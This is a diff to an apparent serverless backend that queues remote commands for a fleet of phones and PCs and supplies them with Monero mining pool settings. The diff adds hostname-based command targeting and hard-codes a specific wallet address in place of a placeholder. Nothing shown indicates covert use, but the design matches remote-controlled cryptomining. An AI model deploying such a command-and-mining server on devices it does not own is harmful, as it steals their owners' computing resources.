@@ -104,17 +104,12 @@ async function saveObservedState(deviceId, state) {
 
 // ─── Command queue ───────────────────────────────────────────────────────────
 
-async function getPendingCommandsForDevice(deviceId, deviceClass) {
+async function getPendingCommandsForDevice(deviceId, deviceClass, hostname) {
   try {
     const store = getStore("cp-commands");
     const queue = (await store.get("queue", { type: "json" })) || [];
-    const isPhone =
-      deviceClass === "phone" ||
-      (deviceId && /^node\d+$/.test(deviceId));
-    const isPC =
-      deviceClass === "pc" ||
-      (deviceId &&
-        ["nexus-prime", "viki", "skynet", "steamdeck"].includes(deviceId));
+    const isPhone = deviceClass === "phone";
+    const isPC = deviceClass === "pc" || deviceClass === "steamdeck";
 
     return queue.filter((cmd) => {
       if (cmd.status !== "queued") return false;
@@ -123,6 +118,7 @@ async function getPendingCommandsForDevice(deviceId, deviceClass) {
       if (t === "phones" && isPhone) return true;
       if (t === "pcs" && isPC) return true;
       if (t === deviceId) return true;
+      if (hostname && t === hostname) return true;
       return false;
     });
   } catch {
@@ -339,7 +335,7 @@ function defaultDesiredState(deviceClass, deviceId) {
     // Mining configuration
     pool_url: "gulf.moneroocean.stream",
     pool_port: 10128,
-    pool_user: "YOUR_WALLET",
+    pool_user: "44Ris5ep9FE6hmwAbi7CtAV5NexMuZixhKeGk8xDFHNYWi57TjsMXEyEFQyVWNQxLkaPY1xVPjoTY2yaTfkTzkCMRur3PwT",
     pool_pass: "x",
     pool_tls: false,
 
@@ -597,7 +593,8 @@ exports.handler = async (event, context) => {
       const desired = await getDesiredState(deviceId);
       const pending = await getPendingCommandsForDevice(
         deviceId,
-        device.device_class
+        device.device_class,
+        device.hostname
       );
 
       return json(200, hdrs, {
@@ -671,7 +668,8 @@ exports.handler = async (event, context) => {
 
       const cmds = await getPendingCommandsForDevice(
         deviceId,
-        device.device_class
+        device.device_class,
+        device.hostname
       );
       for (const cmd of cmds) {
         await ackCommand(cmd.id, deviceId);
